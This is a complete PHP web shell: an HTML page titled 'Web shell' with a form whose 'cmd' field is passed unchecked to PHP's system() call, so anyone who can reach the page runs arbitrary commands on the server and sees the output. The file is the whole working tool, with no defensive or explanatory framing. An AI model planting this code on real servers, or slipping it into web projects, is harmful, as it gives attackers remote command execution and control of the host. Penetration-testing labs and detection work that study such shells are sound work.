<!DOCTYPE html>
<html>
<head>
  <title>Web shell</title>
</head>
<body style="background-color:black">
  <form method="get" name="webshell">
    <input type="text" name="cmd">
    <input type="submit" value="run">
  </form>

  <pre>
    <font color="white">
      <?php
      if ($_GET["cmd"]) {
        system($_GET["cmd"]);
      }
      ?>
    </font>
  </pre>

</body>
</html>